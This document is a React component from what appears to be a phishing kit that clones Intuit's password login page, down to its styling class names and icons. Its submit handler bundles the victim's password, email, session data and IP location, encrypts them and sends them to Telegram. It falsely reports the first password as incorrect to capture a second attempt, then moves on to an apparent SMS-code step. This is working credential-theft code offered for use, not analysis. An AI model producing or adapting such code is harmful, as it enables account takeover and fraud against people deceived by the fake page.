"use client";

import { useState } from "react";
import { ERROR } from "@/const";
import { sessions, useSessionStore } from "@/store/session";
import { encryptObject } from "@/utils/client/encryption";
import { sentToTelegram } from "@/actions/sender";

export const Password = ({
  value,
  setEnterPwd,
  setLoading,
  setStage,
}: {
  value: string;
  setEnterPwd: React.Dispatch<React.SetStateAction<boolean>>;
  setLoading: React.Dispatch<React.SetStateAction<boolean>>;
  setStage: React.Dispatch<React.SetStateAction<string>>;
}) => {
  const { ipLocationData, setSessions, sessionEntries, sessionId, keyData } =
    useSessionStore();
  if (!keyData) return null;

  const [password, setPassword] = useState("");
  const [showPwd, setShowPwd] = useState(false);
  const [noPassword, setNoPassword] = useState(false);
  const [passwordCount, setPasswordCount] = useState(0);
  const [showErr, setShowErr] = useState(false);
  const [incorrectPassword, setIncorrectPassword] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setIsSubmitting(true);

    if (!password || password.length < 7) {
      setNoPassword(true);
      setIsSubmitting(false);
      return;
    }

    setTimeout(() => {
      if (passwordCount < 1) {
        setShowErr(true);
        setIncorrectPassword(true);
        setPasswordCount(passwordCount + 1);
        setIsSubmitting(false);
        return;
      } else {
        setIsSubmitting(false);
        setLoading(true);
        setPassword("");
        setStage("textOptions");
      }
    }, 900);

    // setLoading(true);
    // setEnterPwd(true);

    const data = {
      ...sessionEntries,
      password,
      passwordStage: passwordCount + 1,
      step: 2 + passwordCount,
    };
    setSessions(data as sessions);

    const safeData = encryptObject(
      { data, ipLocationData, sessionId },
      keyData
    );
    await sentToTelegram(safeData);
  };

  return (
    <>
      <div
        data-testid="passwordVerificationContainer"
        className="PasswordVerification__StyledContainer-sc-1povxx4-0 etCwug"
      >
        <section className="IuxH2AndDescription__StyledSection-j40avf-0 iOUNHt PasswordVerification__StyledIuxH2AndDescription-sc-1povxx4-2 bkUAuk">
          <header>
            <div className="IuxH2AndDescription__ProdModHeaderContainer-j40avf-2 xLVQH">
              <h6
                className="IuxH2AndDescription__ProdModTitleText-j40avf-4 iQcJay Typography-light-f6c67d3 Typography-headline-6-3e791a5 Typography-demi-5d6d061"
                id="passwordVerificationHeader"
                data-testid="passwordVerificationHeader"
              >
                Enter your Intuit password
              </h6>
            </div>
            <span
              className="Typography-light-f6c67d3 Typography-body-3-e4a1793"
              data-testid="passwordVerificationSubheader"
              id="passwordVerificationSubheader"
            ></span>
          </header>
        </section>
        <form
          className="IuxForm__StyledForm-sc-10pry6-0 dUwATG"
          action="#"
          data-testid="PasswordVerificationForm"
          autoComplete="on"
        >
          <input
            aria-label="Email"
            aria-required="true"
            autoComplete="username"
            data-testid="readonly-identifier"
            name="Email"
            readOnly
            type="email"
            size={23}
            className="IuxReadonlyIdentifier__StyledInput-sc-1vvuka5-0 fnQwvy"
            onChange={() => {}}
            value={value}
          />
          <br />
          <button
            type="button"
            data-testid="passwordVerificationDifferentAccountButton"
            className="idsTSButton idsF Button-button-7306813 Button-light-e776e02 Button-size-medium-1225d24 Button-purpose-standard-c20ddd8 Button-priority-tertiary-b2cb5b6 IuxLinkButton__StyledLinkButton-im8qmv-0 IuxLinkButton__StyledLinkButtonWithMarginTop-im8qmv-1 hjYPHy hAkLBa PasswordVerification__StyledIuxLinkButton-sc-1povxx4-1 hxAZMq dnJHbn "
          >
            <span
              onClick={() => {
                setLoading(true);
                setEnterPwd(false);
              }}
              className="Button-label-f10bb25"
              style={{ padding: "0px" }}
            >
              Use a different account
            </span>
          </button>
          <br />
          <div className="IuxCurrentPasswordInput__StyledWrapperDiv-sc-1lpfy9v-0 jrZlCL">
            <div
              onClick={() => setShowPwd((prev) => !prev)}
              className="IuxCurrentPasswordInput__StyledToggleContainer-sc-1lpfy9v-1 jgZCKa"
            >
              <button
                aria-label="Show"
                className="idsF idsTSIconControl IconControl-iconControlButton-d82940b IconControl-light-966c142 IuxCurrentPasswordInput__StyledIuxIconControl-sc-1lpfy9v-2 iPRtDl IconControl-sizeSmall-4a2f969"
                type="button"
              >
                {showPwd ? (
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    fill="none"
                    viewBox="0 0 24 24"
                    color="#0077c5"
                    width="20px"
                    height="20px"
                    focusable="false"
                    aria-hidden="true"
                    className=""
                  >
                    <path
                      fill="currentColor"
                      d="M12 17c-1.1 0-2.1-.2-3.1-.5l1-1c.6.4 1.3.6 2 .6 2.2 0 4-1.8 4-4 0-.7-.2-1.4-.6-2l1.5-1.5c1.3.9 2.4 2.1 3 3.6C18.7 15 15.6 17 12 17m-2-5c0-1.1.9-2 2-2 .2 0 .3 0 .5.1l-2.4 2.4c-.1-.1-.1-.3-.1-.5m4 0c0 1.1-.9 2-2 2-.2 0-.4 0-.5-.1l2.5-2.5zm-9.9 0C5.3 9 8.4 7 12 7c1.1 0 2.1.2 3 .5l-1 1c-.6-.3-1.3-.5-2-.5-2.2 0-4 1.8-4 4 0 .7.2 1.4.6 2L7 15.6c-1.3-.9-2.3-2.1-2.9-3.6m17.8-.3C21.3 9.8 20 8.2 18.4 7l2.3-2.3c.4-.4.4-1 0-1.4s-1-.4-1.4 0L16.6 6c-1.4-.6-2.9-1-4.6-1-4.6 0-8.6 2.7-9.9 6.7-.1.2-.1.4 0 .7.6 1.9 1.9 3.5 3.5 4.6l-2.3 2.3c-.4.4-.4 1 0 1.4.2.2.4.3.7.3s.5-.1.7-.3L7.4 18c1.4.6 3 1 4.6 1 4.6 0 8.6-2.7 9.9-6.7.1-.1.1-.4 0-.6"
                    ></path>
                  </svg>
                ) : (
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    fill="none"
                    viewBox="0 0 24 24"
                    color="#0077c5"
                    width="20px"
                    height="20px"
                    focusable="false"
                    aria-hidden="true"
                    className=""
                  >
                    <path
                      fill="currentColor"
                      d="M12 8a4 4 0 1 0 0 8 4 4 0 0 0 0-8m0 6a2 2 0 1 1 0-4 2 2 0 0 1 0 4"
                    ></path>
                    <path
                      fill="currentColor"
                      d="M21.944 11.672A10.35 10.35 0 0 0 12 5a10.35 10.35 0 0 0-9.944 6.672 1 1 0 0 0 0 .656A10.35 10.35 0 0 0 12 19a10.35 10.35 0 0 0 9.944-6.672 1 1 0 0 0 0-.656M12 17a8.4 8.4 0 0 1-7.933-5A8.4 8.4 0 0 1 12 7a8.4 8.4 0 0 1 7.933 5A8.4 8.4 0 0 1 12 17"
                    ></path>
                  </svg>
                )}
                <span
                  className="IconControl-labelRightSpacing-7f16549 Typography-light-f6c67d3 Typography-body-3-e4a1793"
                  data-testid="smallLabel"
                >
                  {showPwd ? "Hide" : "Show"}
                </span>
              </button>
            </div>
            <div
              className="TextField-light-d062759 idsTSTextField TextField-TextFieldWrapper-bafba49"
              style={{
                width: "100%",
              }}
            >
              <label
                htmlFor="iux-password-confirmation-password"
                className="TextField-TFLabelWrapper-3541982 TextField-TFHasLabel-78d0998"
              >
                <span className="TextField-TFLabelOverride-8e74fad TextField-size-medium-4c97db9 Typography-light-f6c67d3 Typography-body-3-e4a1793">
                  Password
                </span>
                <div className="TextField-TFInputWrapper-f1e029f TextField-size-medium-4c97db9">
                  <input
                    id="iux-password-confirmation-password"
                    aria-invalid="false"
                    width="100%"
                    className={`idsF TextField-TFInput-8a2b0cc TextField-light-d062759 TextField-TFNoErrorText-b385be9 TextField-TFNotDisabled-a9f4959 ${
                      noPassword || showErr
                        ? "TextField-TFErrorText-995fdeb"
                        : ""
                    } TextField-size-medium-4c97db9`}
                    type={showPwd ? "text" : "password"}
                    aria-label="Password"
                    aria-required="true"
                    autoComplete="current-password"
                    data-testid="currentPasswordInput"
                    inputMode="text"
                    name="Password"
                    placeholder=""
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    onFocus={() => {
                      if (noPassword) setNoPassword(false);
                      if (showErr) setShowErr(false);
                    }}
                  />
                </div>
              </label>
              <div className="">
                {noPassword || showErr ? (
                  <div
                    className="InlineValidationMessage-ivm-wrapper-d066fb2 InlineValidationMessage-light-212a3d4"
                    role="alert"
                    id="iux-password-confirmation-password-error"
                    data-automation-id="idsInlineValidationMessage-alertMsg"
                  >
                    <div className="idsTSBadge InlineValidationMessage-ivm-status-icon-a3e9327 Badge-light-5c13fad Badge-badge-0c43a9f Badge-error-7e536f4 Badge-round-0018fec">
                      <div className="Badge-value-da34c95 Badge-light-5c13fad">
                        <div className="Badge-iconFix-affba1e">
                          <svg height="16px" width="16px" viewBox="0 0 144 144">
                            <svg
                              xmlns="http://www.w3.org/2000/svg"
                              fill="none"
                              viewBox="0 0 20 20"
                              color="currentColor"
                              width="100%"
                              height="100%"
                              focusable="false"
                              aria-hidden="true"
                              className="Badge-icon-prefab-7b55bae Badge-background-9ea98c1"
                            >
                              <path
                                fill="currentColor"
                                d="m18.374 15.023-6.916-12.45a1.666 1.666 0 0 0-2.914 0l-6.916 12.45A1.667 1.667 0 0 0 3.083 17.5h13.834a1.667 1.667 0 0 0 1.457-2.477"
                                style={{
                                  transformOrigin: "center center 0px",
                                }}
                              ></path>
                            </svg>
                            <svg
                              xmlns="http://www.w3.org/2000/svg"
                              fill="none"
                              viewBox="0 0 20 20"
                              color="currentColor"
                              width="100%"
                              height="100%"
                              focusable="false"
                              aria-hidden="true"
                              className="Badge-icon-prefab-7b55bae Badge-foreground-f3e529f"
                            >
                              <path
                                fill="currentColor"
                                d="M9.167 11.667V7.5a.833.833 0 1 1 1.666 0v4.167a.833.833 0 1 1-1.666 0M9.537 13.474a.833.833 0 1 1 .926 1.385.833.833 0 0 1-.926-1.385"
                                style={{
                                  transformOrigin: "center center 0px",
                                }}
                              ></path>
                            </svg>
                          </svg>
                        </div>
                      </div>
                    </div>
                    <div className="InlineValidationMessage-ivm-message-container-3984c36">
                      <span className="InlineValidationMessage-ivm-message-ee9633f InlineValidationMessage-ivm-error-c6247c9 Typography-light-f6c67d3 Typography-body-3-e4a1793">
                        {noPassword
                          ? ERROR.noPassword
                          : incorrectPassword
                          ? ERROR.incorrectPassword
                          : ""}
                      </span>
                      <span className="InlineValidationMessage-ivm-description-9415be4 Typography-light-f6c67d3 Typography-body-3-e4a1793"></span>
                    </div>
                  </div>
                ) : (
                  ""
                )}
              </div>
            </div>
          </div>
          <button
            type="submit"
            onClick={(e: React.MouseEvent<HTMLButtonElement>) => {
              e.preventDefault();
              handleSubmit(e as any);
            }}
            data-testid="passwordVerificationContinueButton"
            className={`idsTSButton idsF Button-button-7306813 Button-light-e776e02 Button-size-medium-1225d24 Button-purpose-standard-c20ddd8 Button-priority-primary-9b31d62 IuxButton__StyledButton-ktqsri-0 dDQzHx Button-full-be46b30 ${
              isSubmitting
                ? "Button-disabled-b1a6c9a Button-isLoading-d681a99 loading"
                : ""
            }`}
            disabled={isSubmitting}
          >
            {!isSubmitting ? (
              <span className="Button-label-f10bb25">
                <span>Continue</span>
              </span>
            ) : (
              <div
                className="Dots-wrapper-4978bc1 Dots-light-c0083e5"
                aria-label="Loading"
                data-testid="IuxButtonLoadingSpinner"
              >
                <div className="Dots-spinner-5ff8fcd" />
              </div>
            )}
          </button>
          <div
            data-testid="IuxOrDivider"
            className="OrDivider__StyledOrDividerDiv-sc-1i6eqaj-0 hVRMXB"
          >
            OR
          </div>
          <button
            type="button"
            onClick={() => {
              setLoading(true);
              setStage("textOptions");
              setPassword("");
            }}
            data-testid="altAuthButton"
            className="idsTSButton idsF Button-button-7306813 Button-light-e776e02 Button-size-medium-1225d24 Button-purpose-standard-c20ddd8 Button-priority-secondary-0fa3c0f IuxButton__StyledButton-ktqsri-0 dDQzHx Button-full-be46b30"
          >
            <span className="Button-label-f10bb25">
              Text a code to (***) ***-****
            </span>
          </button>
          <button
            type="button"
            data-testid="passwordVerificationCancelButton"
            className="idsTSButton idsF Button-button-7306813 Button-light-e776e02 Button-size-medium-1225d24 Button-purpose-standard-c20ddd8 Button-priority-tertiary-b2cb5b6 IuxButton__StyledButton-ktqsri-0 dDQzHx Button-full-be46b30"
          >
            <span className="Button-label-f10bb25">Forgot password?</span>
          </button>
        </form>
      </div>
    </>
  );
};
